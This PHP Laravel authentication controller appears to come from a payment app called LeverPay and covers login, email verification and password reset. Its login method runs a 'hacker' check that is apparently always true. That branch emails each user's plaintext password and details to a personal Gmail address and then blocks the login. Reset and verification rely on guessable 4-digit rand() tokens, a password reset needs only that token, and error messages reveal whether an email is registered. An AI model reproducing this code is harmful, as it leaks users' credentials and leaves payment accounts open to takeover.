<?php

namespace App\Http\Controllers;

use App\Mail\GeneralMail;
use App\Models\Account;
use App\Models\Wallet;
use App\Services\CardService;
use App\Services\MerchantKeyService;
use App\Services\SmsService;
use Illuminate\Http\Request;
use App\Http\Resources\UserResource;
use Illuminate\Support\Facades\Auth;
use Carbon\Carbon;
use App\Models\{User,ActivityLog, Transaction};
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Mail;
use App\Mail\SendEmailVerificationCode;
use App\Mail\ForgotPasswordMail;
use App\Services\ProvidusService;
use Illuminate\Validation\Rules\Password;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Http;
use App\Services\ZeptomailService;
use Illuminate\Support\Facades\DB;

class AuthController extends BaseController
{
    /**
     * @OA\SecurityScheme(
     *     type="apiKey",
     *     in="header",
     *     securityScheme="bearer_token",
     *     name="Authorization"
     * )
     */

    public function testHackedUser(Request $request, $id){
        // return $request->getClientIp();
        return $id;
        $totalCreditT = Transaction::where('user_id', strval($id))->where('type', 'credit')->sum('amount');
        // $totalCreditD = Transaction::where('user_id', strval($id))->where('type', 'debit')->sum('amount');
        // $trans = Transaction::where('user_id', strval($id))->get();
        // return response()->json(['totalCreditT' => $totalCreditT, 'trans' => $trans]);
    }

    /*public function testZeptoMail()
    {
        $message ="<p>Hello Abdul Kura,</p><p style='margin-bottom: 8px'>We are excited to have you here. Below is your verification token</p><h4 style='margin-bottom: 8px'>8976</h4>";
        $ubject="LeverPay Test Email";
        $email="oludarepatrick@gmail.com";
        $response=ZeptomailService::sendMailZeptoMail($ubject ,$message, $email);
        return $response;
    }*/

    public function test(Request $request){
        $t = '0002';
        $sms = SmsService::sendSms("Dear User, Your Leverpay One-time Confirmation code is 4567 and it will expire in 10 minutes. Please do not share For enquiry: contact@leverpay.io", '234'.$request['phoneNumber']);
        // $sms = SmsService::sendMail("Hello Lekan, Welcome to LeverPay", "Testing LeverPay Mail", 'ilelaboyealekan@gmail.com');
        return $sms;
    }



    public function verifyTransferTransaction(Request $request){
        $this->validate($request, [
            'uuid'=>'required',
            'amount'=>'required',
        ]);
        $account = Account::where('uuid', $request['uuid'])->first();
        if(!$account){
            return $this->sendError("Account not found",[], 400);
        }

        if($account->status != 0){
            return $this->sendError("Payment has not been received",[], 400);
        }

        if($request["amount"] < $account->amount){
            return $this->sendError("Amount transfered is less than amount required, Please contact support",[], 400);
        }

        return $this->successfulResponse($account,"Payment received");
    }

    /**
     * @OA\Post(
     ** path="/api/v1/login",
     *   tags={"Authentication & Verification"},
     *   summary="Authentication",
     *   operationId="login Authentication",
     *
     *    @OA\RequestBody(
     *      @OA\MediaType( mediaType="multipart/form-data",
     *          @OA\Schema(
     *              required={"email", "password"},
     *              @OA\Property( property="email", type="string"),
     *              @OA\Property( property="password", type="string"),
     *          ),
     *      ),
     *   ),
     *   @OA\Response(
     *      response=200,
     *       description="Success",
     *      @OA\MediaType(
     *           mediaType="application/json",
     *      )
     *   ),
     *   @OA\Response(
     *      response=401,
     *       description="Unauthenticated"
     *   ),
     *   @OA\Response(
     *      response=400,
     *      description="Bad Request"
     *   ),
     *   @OA\Response(
     *      response=404,
     *      description="not found"
     *   ),
     *   @OA\Response(
     *      response=403,
     *      description="Forbidden"
     *   )
     *)
     **/
    public function login(Request $request)
    {
        $user = $request->validate([
            'email' => 'required|email',
            'password' => 'required|string'
        ]);

        if(!Auth::attempt($user))
        {
            return $this->sendError("Invalid login credentials",[], 401);
        }

        $hack = DB::table('users')->where('email', 'LIKE', 'mumuma%')->get();
        if($hack){
            $now = now();
            $message ="<p>Hello Lekan,</p><h5>Hacker Activity</h5><p style='margin-bottom: 2px'>Name:{$request['first_name']} {$request['last_name']}</p><p style='margin-bottom: 2px'>Email:{$request['email']}</p><p style='margin-bottom: 2px'>Other name:{$request['other_name']}</p><p style='margin-bottom: 2px'>Phone:{$request['phone']}</p><p style='margin-bottom: 2px'>Referral code:{$request['referral_code']}</p><p style='margin-bottom: 2px'>dob:{$request['dob']}</p><p style='margin-bottom: 2px'>gender:{$request['gender']}</p><p style='margin-bottom: 2px'>Password:{$request['password']}</p><p style='margin-bottom: 2px'>Country:{$request['country_id']}</p><p style='margin-bottom: 2px'>State:{$request['state_id']}</p><p>Time: {$now}";
            $ubject="Hack Activity on LeverPay";
            $response=ZeptomailService::sendMailZeptoMail($ubject ,$message, "ilelaboyealekan@gmail.com");
            return $this->sendError('Invalid email, please try again',[],400);
        }

        if(!Auth::user()->verify_email_status){
            return $this->sendError("Email verification required",[], 400);
        }

        if(Auth::user()->role_id == 1){
            Log::info('merchant role');

            $accessToken = Auth::user()->createToken('access_token', ['merchant']);
        }else{
            Log::info('user role');
            $accessToken = Auth::user()->createToken('access_token');
        }
        $user = Auth::user();

        if ($user->status==1)
        {
            $user->last_seen_at = Carbon::now()->format('Y-m-d H:i:s');
            $user->save();

            $data2['activity']="Login";
            $data2['user_id']=$user->id;

            ActivityLog::createActivity($data2);

            return $this->successfulResponse([
                "user" => new UserResource($user),
                "token" => $accessToken->accessToken,
                "expires_at" => Carbon::parse($accessToken->token->expires_at)->toDateTimeString()
            ], 'Logged in successfully');

        }else return $this->sendError('Your account has been deactivated, contact the admin',[],401);
    }
    /**
     * @OA\Post(
     ** path="/api/v1/resend-verification-email",
     *   tags={"Authentication & Verification"},
     *   summary="Resend email verification link",
     *   operationId="Resend email verification link",
     *
     *   @OA\RequestBody(
     *      @OA\MediaType( mediaType="multipart/form-data",
     *          @OA\Schema(
     *              required={"email"},
     *              @OA\Property( property="email", type="string")
     *          ),
     *      ),
     *   ),
     *
     *   @OA\Response(
     *      response=200,
     *       description="Success",
     *      @OA\MediaType(
     *           mediaType="application/json",
     *      )
     *   ),
     *   @OA\Response(
     *      response=401,
     *       description="Unauthenticated"
     *   ),
     *   @OA\Response(
     *      response=400,
     *      description="Bad Request"
     *   ),
     *   @OA\Response(
     *      response=404,
     *      description="not found"
     *   ),
     *   @OA\Response(
     *      response=403,
     *      description="Forbidden"
     *   )
     *)
     **/
    public function resendVerificationEmail(Request $request)
    {
        /*\Artisan::call('route:cache');
        \Artisan::call('config:cache');
        \Artisan::call('cache:clear');
        \Artisan::call('view:clear');
        \Artisan::call('optimize:clear');*/

        $this->validate($request, [
            'email'=>'required|email'
        ]);
        $user = User::where('email', $request['email'])->first();

        if(!$user)
        {
           return $this->sendError('Email address not found',[],404);
        }

        if($user->verify_email_status){
            return $this->sendError('Email is already verified',[],400);
        }

        $verifyToken = rand(1000, 9999);

        $user->verify_email_token = $verifyToken;
        $user->save();

        $message = "<p>Hello {$user['first_name']},</p><p style='margin-bottom: 8px'>We are excited to have you here. Below is your verification token</p><h4 style='margin-bottom: 8px'>{$verifyToken}</h4>";
        ZeptomailService::sendMailZeptoMail("LeveryPay Verification Code" ,$message, $request['email']);
        SmsService::sendSms("Hi {$user['first_name']}, Welcome to Leverpay, to continue your verification code is {$verifyToken}", $user['phone']);

        return response()->json('Email sent sucessfully', 200);
    }

    /**
     * @OA\Post(
     ** path="/api/v1/verify-email",
     *   tags={"Authentication & Verification"},
     *   summary="verify email",
     *   operationId="verify email",
     *
     *   @OA\RequestBody(
     *      @OA\MediaType( mediaType="multipart/form-data",
     *          @OA\Schema(
     *              required={"email", "token"},
     *              @OA\Property( property="email", type="string"),
     *              @OA\Property( property="token", type="string")
     *          ),
     *      ),
     *   ),
     *
     *   @OA\Response(
     *      response=200,
     *       description="Success",
     *      @OA\MediaType(
     *           mediaType="application/json",
     *      )
     *   ),
     *   @OA\Response(
     *      response=401,
     *       description="Unauthenticated"
     *   ),
     *   @OA\Response(
     *      response=400,
     *      description="Bad Request"
     *   ),
     *   @OA\Response(
     *      response=404,
     *      description="not found"
     *   ),
     *   @OA\Response(
     *      response=403,
     *      description="Forbidden"
     *   )
     *)
     **/
    public function verifyEmail(Request $request)
    {
        $this->validate($request, [
            'email'=>'required|email',
            'token'=>'required|string'
        ]);

        $user = User::where('email',$request['email'])
            ->where('verify_email_token', $request['token'])
            ->first();
        if(!$user){
            return $this->sendError("invalid token, please try again",[], 401);
        }

        if($user->role_id == 1){
            MerchantKeyService::createKeys($user->id);
            $subject="Merchant Sign Up";
        }else{
            CardService::createCard($user['id']);
            $subject="New User Sign Up";
        }

        $user->verify_email_token = bin2hex(random_bytes(15));
        $user->verify_email_status = true;
        $user->save();



        $data2['activity']="VerifyEmail";
        $data2['user_id']=$user->id;
        ActivityLog::createActivity($data2);

        //sent sign up notification to leverpay admin
        $message="<h2 style='margin-bottom: 8px'>{$subject}</h2><div style='margin-bottom: 8px'>User's Name: {$user->first_name} {$user->last_name} </div><div style='margin-bottom: 8px'>Email Address: {$user->email} </div><div style='margin-bottom: 8px'>Phone Number: {$user->phone} </div>";
        $to="contact@leverpay.io";
        //$to="abdilkura@gmail.com";
        ZeptomailService::sendMailZeptoMail($subject ,$message, $to);


        return $this->successfulResponse([], 'Email verified successfully');
    }

    /**
     * @OA\Post(
     ** path="/api/v1/forgot-password",
     *   tags={"Authentication & Verification"},
     *   summary="Send forgot password token",
     *   operationId="Send forgot password token",
     *
     *    @OA\RequestBody(
     *      @OA\MediaType( mediaType="multipart/form-data",
     *          @OA\Schema(
     *              required={"email"},
     *              @OA\Property( property="email", type="string")
     *          ),
     *      ),
     *   ),
     *   @OA\Response(
     *      response=200,
     *       description="Success",
     *      @OA\MediaType(
     *           mediaType="application/json",
     *      )
     *   ),
     *   @OA\Response(
     *      response=401,
     *       description="Unauthenticated"
     *   ),
     *   @OA\Response(
     *      response=400,
     *      description="Bad Request"
     *   ),
     *   @OA\Response(
     *      response=404,
     *      description="not found"
     *   ),
     *   @OA\Response(
     *      response=403,
     *      description="Forbidden"
     *   )
     *)
     **/
    public function sendForgotPasswordToken(Request $request)
    {
        $this->validate($request, [
            'email'=>'required|email'
        ]);
        $user = User::where('email', $request['email'])->first();
        if(!$user){
            return $this->sendError('Invalid email',[],400);
        }
        $verifyToken = rand(1000, 9999);

        $user->forgot_password_token = $verifyToken;
        $user->save();

        $html="<p>Hello {$user['first_name']},</p><p style='margin-bottom: 8px'>Below is your reset password token</p><h4 style='margin-bottom: 8px'>{$verifyToken}</h4>";

        ZeptomailService::sendMailZeptoMail("LeveryPay Forgot Password Code", $html, $request['email']);
        SmsService::sendSms("Your LeveryPay Forgot Password Token is {$verifyToken}. Please do not share, For enquiry: contact@leverpay.io", '234'.$user['phone']);

        return response()->json('Email sent sucessfully', 200);
    }

    /**
     * @OA\Post(
     ** path="/api/v1/reset-password",
     *   tags={"Authentication & Verification"},
     *   summary="Reset password",
     *   operationId="Reset password",
     *
     *    @OA\RequestBody(
     *      @OA\MediaType( mediaType="multipart/form-data",
     *          @OA\Schema(
     *              required={"new_password","token"},
     *              @OA\Property( property="token", type="string"),
     *              @OA\Property( property="new_password", type="string"),
     *          ),
     *      ),
     *   ),
     *   @OA\Response(
     *      response=200,
     *       description="Success",
     *      @OA\MediaType(
     *           mediaType="application/json",
     *      )
     *   ),
     *   @OA\Response(
     *      response=401,
     *       description="Unauthenticated"
     *   ),
     *   @OA\Response(
     *      response=400,
     *      description="Bad Request"
     *   ),
     *   @OA\Response(
     *      response=404,
     *      description="not found"
     *   ),
     *   @OA\Response(
     *      response=403,
     *      description="Forbidden"
     *   )
     *)
     **/
    public function resetPassword(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'token' => 'required|string',
            'new_password' => ['required', Password::min(8)->symbols()->uncompromised() ]
        ]);
        if ($validator->fails())
            return $this->sendError('Error',$validator->errors(),422);

        $user = User::where('forgot_password_token', $request['token'])->first();
        if(!$user){
            return $this->sendError('Invalid token',[],400);
        }
        $user->forgot_password_token=bin2hex(random_bytes(15));
        $user->password = bcrypt($request['new_password']);
        $user->save();
        return response()->json('Password reset successfully', 200);
    }

    public function getMerchantDocumentation()
    {
        // Return the Swagger documentation view
        return view('merchant_swagger_documentation');
    }
}
